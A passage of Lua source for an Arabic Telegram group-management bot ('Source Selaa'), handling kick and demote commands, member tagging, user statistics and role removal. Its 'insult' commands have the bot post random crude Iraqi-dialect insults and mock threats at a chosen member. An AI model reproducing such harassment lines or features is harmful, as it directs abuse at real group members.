local text =  [[
Welcome To Source
↯☆Selaa TEAM
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)


↯☆[Developer](https://t.me/IE_S9)
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
]]
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
--     Source Selaa     --
if ChatType == 'sp' or ChatType == 'gp'  then
if text == "اطردني" and ChCheck(msg) or text == "ادفرني" and ChCheck(msg) then
if Selaa:get(Selaa.."Selaa:Kick:Me"..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
Selaa:set(Selaa..'yes'..msg.sender_user_id_..'', 'delyes')
Selaa:set(Selaa..'no'..msg.sender_user_id_..'', 'delno')
local Text = '↯☆هل انت متأكد من المغادره'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/delyes"},{text="لا",callback_data="/delno"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Selaa     --
if text == 'تعطيل اطردني' and Manager(msg) and ChCheck(msg) then
Selaa:set(Selaa.."Selaa:Kick:Me"..msg.chat_id_, true)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل اطردني' and Manager(msg) and ChCheck(msg) then
Selaa:del(Selaa.."Selaa:Kick:Me"..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل امر اطردني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source Selaa     --
if text == "نزلني" and ChCheck(msg) then
if Selaa:get(Selaa.."Selaa:Del:Me"..msg.chat_id_) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆عذرا هذه الخاصيه معطله ', 1, 'md')
return false
end
Selaa:set(Selaa..'yesdel'..msg.sender_user_id_..'', 'delyes')
Selaa:set(Selaa..'nodel'..msg.sender_user_id_..'', 'delno')
local Text = '↯☆هل انت متأكد من تنزيلك'
keyboard = {} 
keyboard.inline_keyboard = {{{text="نعم",callback_data="/yesdel"},{text="لا",callback_data="/nodel"}}} 
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--     Source Selaa     --
if text == 'تعطيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
Selaa:set(Selaa.."Selaa:Del:Me"..msg.chat_id_, true)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تعطيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
if text == 'تفعيل نزلني' and BasicConstructor(msg) and ChCheck(msg) then
Selaa:del(Selaa.."Selaa:Del:Me"..msg.chat_id_)
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم تفعيل امر نزلني'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end
--     Source Selaa     --
if Admin(msg) then
if text and text == "تاك للكل" and ChCheck(msg) then
function TagAll(dp1,dp2)
local text = "↯☆وينكم يالربع \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if Selaa:get(Selaa..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..Selaa:get(Selaa..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
--     Source Selaa     --
if text:match("^قول (.*)$") and ChCheck(msg) then
local txt = {string.match(text, "^(قول) (.*)$")}
function TagAll(dp1,dp2)
local text = "↯☆"..txt[2].." \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n"
i = 0
for k, v in pairs(dp2.members_) do
i = i + 1
if Selaa:get(Selaa..'Save:UserName'..v.user_id_) then
text = text..""..i.."~ : [@"..Selaa:get(Selaa..'Save:UserName'..v.user_id_).."]\n"
else
text = text..""..i.."~ : "..v.user_id_.."\n"
end
end 
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},TagAll,nil)
end
end
--     Source Selaa     --
if text:match("^رسائلي$") and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = Selaa:get(Selaa..'Selaa:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Selaa(msg.chat_id_, msg.id_, 1, "↯☆عدد رسائلك هنا ⇇ *❨ "..user_msgs.." ❩*", 1, 'md')
end
--     Source Selaa     --
if text:match("^معرفي$") and ChCheck(msg) then
function get_username(extra,result,success)
text = '↯☆معرفك ⇇ ❨ User ❩'
local text = text:gsub('User',('@'..result.username_ or ''))
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_username)
end
--     Source Selaa     --
if text:match("^اسمي$") and ChCheck(msg) then
function get_firstname(extra,result,success)
text = '↯☆اسمك ⇇ firstname lastname'
local text = text:gsub('firstname',(result.first_name_ or ''))
local text = text:gsub('lastname',(result.last_name_ or ''))
Selaa(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
getUser(msg.sender_user_id_,get_firstname)
end   
--     Source Selaa     --
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" then  Selaa(msg.chat_id_, msg.id_, 1, '↯☆@HMSEBOT', 1, 'md') end
if text:match("^رابط حذف$") or text:match("^رابط الحذف$") or text:match("^اريد رابط الحذف$") or  text:match("^شمرلي رابط الحذف$") or text:match("^اريد رابط حذف$") then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'↯☆اضغط للحصول على الرابط',nil,inline) return false end
if text:match("^بوت الحذف$") or text:match("^اريد بوت الحذف$") or text:match("^اريد بوت حذف$") or text:match("^بوت حذف$") or text:match("^بوت حذف حسابات$") or text:match("^راح احذف$") then local inline = {{{text="اضغط هنا",url="https://t.me/DYFBOT"}}} SendInline(msg.chat_id_,'↯☆اضغط للحصول على البوت',nil,inline) return false end
if text:match("^جهاتي$") and ChCheck(msg) or text:match("^اضافاتي$") and ChCheck(msg) then add = (tonumber(Selaa:get(Selaa..'Selaa:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Selaa(msg.chat_id_, msg.id_, 1, "↯☆عدد جهاتك المضافه ⇇ *❨ "..add.." ❩* ", 1, 'md') end
if text:match("^تعديلاتي$") or text:match("^سحكاتي$") and ChCheck(msg) then local edit_msg = Selaa:get(Selaa..'Selaa:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Selaa(msg.chat_id_, msg.id_, 1, "↯☆عدد تعديلاتك ⇇ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text:match("^ايديي$") and ChCheck(msg) then Selaa(msg.chat_id_, msg.id_, 1,'↯☆ايديك ⇇ ❨ `'..msg.sender_user_id_..'` ❩', 1, 'md') end
if text:match("^رتبتي$") and ChCheck(msg) then Selaa(msg.chat_id_, msg.id_, 1, '↯☆رتبتك ⇇ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text:match("^ايدي المجموعه$") and ChCheck(msg) then Selaa(msg.chat_id_, msg.id_, 1, "↯☆ايدي المجموعه ⇇ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then Selaa:del(Selaa..'Selaa:EditMsg'..msg.chat_id_..msg.sender_user_id_) Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then Selaa:del(Selaa..'Selaa:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Selaa(msg.chat_id_, msg.id_, 1, '↯☆تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source Selaa     --
if text == "المطور" then 
local DevCh1 = Selaa:get(Selaa.."Selaa3")
local DevText = Selaa:get(Selaa.."DevText")
if DevCh1 then DevCh = '\n↯☆*Dev Ch* ↬ ['..DevCh1..']' else DevCh = '' end
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp) 
if dp.username_ ~= false then DevUser = '@'..dp.username_ else DevUser = dp.first_name_ end
if DevText then
Selaa(msg.chat_id_, msg.id_, 1, DevText, 1, "md")
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆*Dev User* ↬ ['..DevUser..']\n↯☆*Dev Id* ↬ '..DevId..''..DevCh, 1, "md")
end
end,nil)
end 
--     Source Selaa     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function SelaaTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Selaa(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1059262308) then 
Selaa(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if Selaa:sismember(Selaa.."Selaa:SelaaConstructor:"..msg.chat_id_,result.id_) then
Selaa(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local SelaaTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md') 
local SelaaTEAM = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Selaa(msg.chat_id_, result.id_, 1,''..SelaaTEAM[math.random(#SelaaTEAM)]..'', 1, 'html') 
else  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,SelaaTEAM)
end
--     Source Selaa     --
if text:match("^هينه$") or text:match("^بعد هينه$") or text:match("^هينه بعد$") or text:match("^لك هينه$") or text:match("^هينها$") or text:match("^هينهه$") or text:match("^رزله$") or text:match("^رزلهه$") or text:match("^رزلها$") then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Selaa) then 
Selaa(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Selaa(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1059262308) then  
Selaa(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if Selaa:sismember(Selaa.."Selaa:SelaaConstructor:"..msg.chat_id_,result.sender_user_id_) then
Selaa(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local SelaaTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md') 
local SelaaTEAM = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Selaa(msg.chat_id_, result.id_, 1,''..SelaaTEAM[math.random(#SelaaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") or text:match("^بوسه بعد$") or text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") or text:match("^بوسها بعد$") or text:match("^بوسهه$") then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Selaa) then 
Selaa(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Selaa(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local SelaaTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md') 
local SelaaTEAM = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Selaa(msg.chat_id_, result.id_, 1,''..SelaaTEAM[math.random(#SelaaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
if text:match("^صيحه$") or text:match("^صيحها$") or text:match("^صيحهه$") or text:match("^صيح$") then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(Selaa) then 
Selaa(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(DevId) then  
Selaa(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local SelaaTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md') 
local SelaaTEAM = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Selaa(msg.chat_id_, result.id_, 1,''..SelaaTEAM[math.random(#SelaaTEAM)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
--     Source Selaa     --
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function SelaaTEAM(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(Selaa) then  
Selaa(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(DevId) then 
Selaa(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local SelaaTEAM = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Selaa(msg.chat_id_, msg.id_, 1,SelaaTEAM, 1, 'md') 
local SelaaTEAM = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Selaa(msg.chat_id_, result.id_, 1,''..SelaaTEAM[math.random(#SelaaTEAM)]..'', 1, 'html') 
else  
Selaa(msg.chat_id_, msg.id_, 1, '↯☆العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,SelaaTEAM)
end
end
--     Source Selaa     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if Selaa:sismember(Selaa..'Selaa:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if Selaa:sismember(Selaa..'Selaa:ManagerAll:',result.sender_user_id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if Selaa:sismember(Selaa..'Selaa:AdminAll:',result.sender_user_id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if Selaa:sismember(Selaa..'Selaa:VipAll:',result.sender_user_id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if Selaa:sismember(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if Selaa:sismember(Selaa..'Selaa:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if Selaa:sismember(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if Selaa:sismember(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if Selaa:sismember(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if Selaa:sismember(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم تنزيله من ⇇ ⤈\n~ ( "..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆لم تتم ترقيته مسبقا")  
end
if SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
Selaa:srem(Selaa..'Selaa:SudoBot:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:ManagerAll:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:AdminAll:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipAll:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
Selaa:srem(Selaa..'Selaa:ManagerAll:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:AdminAll:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipAll:', result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'absconstructor' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.sender_user_id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if Selaa:sismember(Selaa..'Selaa:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if Selaa:sismember(Selaa..'Selaa:ManagerAll:',result.id_) then
managerall = 'المدراء العامين • ' else managerall = '' end
if Selaa:sismember(Selaa..'Selaa:AdminAll:',result.id_) then
adminall = 'الادمنيه العامين • ' else adminall = '' end
if Selaa:sismember(Selaa..'Selaa:VipAll:',result.id_) then
vpall = 'المميزين العامين • ' else vpall = '' end
if Selaa:sismember(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if Selaa:sismember(Selaa..'Selaa:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if Selaa:sismember(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if Selaa:sismember(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if Selaa:sismember(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if Selaa:sismember(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"reply","↯☆تم تنزيله من ⇇ ⤈\n~ ( "..sudobot..''..managerall..''..adminall..''..vpall..''..basicconstructor..''..constructor..''..manager..''..admins..''..vipmem..''..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"reply","↯☆لم تتم ترقيته مسبقا")  
end 
if SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
Selaa:srem(Selaa..'Selaa:SudoBot:', result.id_)
Selaa:srem(Selaa..'Selaa:ManagerAll:', result.id_)
Selaa:srem(Selaa..'Selaa:AdminAll:', result.id_)
Selaa:srem(Selaa..'Selaa:VipAll:', result.id_)
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
Selaa:srem(Selaa..'Selaa:ManagerAll:', result.id_)
Selaa:srem(Selaa..'Selaa:AdminAll:', result.id_)
Selaa:srem(Selaa..'Selaa:VipAll:', result.id_)
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.id_)
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'absconstructor' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.id_)
Selaa:srem(Selaa..'Selaa:BasicConstructor:'..msg.chat_id_,result.id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Constructor:'..msg.chat_id_,result.id_)
Selaa:srem(Selaa..'Selaa:Cleaner:'..msg.chat_id_, result.id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:Managers:'..msg.chat_id_, result.id_)
elseif SelaaDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
Selaa:srem(Selaa..'Selaa:Admins:'..msg.chat_id_, result.id_)
Selaa:srem(Selaa..'Selaa:VipMem:'..msg.chat_id_, result.id_)
end
else
Selaa(msg.chat_id_, msg.id_, 1, '↯☆المعرف غير صحيح*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     Source Selaa     --
--       Set SudoBot      --
if Sudo(msg) then
if text ==('رفع مطور') and SourceCh(msg) then
function sudo_reply(extra, result, success)
Selaa:sadd(Selaa..'Selaa:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"reply","↯☆تم رفعه في قائمة المطورين")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and text:match('^رفع مطور @(.*)') and SourceCh(msg) then
local username = text:match('^رفع مطور @(.*)')
function promreply(extra,result,success)
if result.id_ then
Selaa:sadd(Selaa..'Selaa:SudoBot:',result.id_)
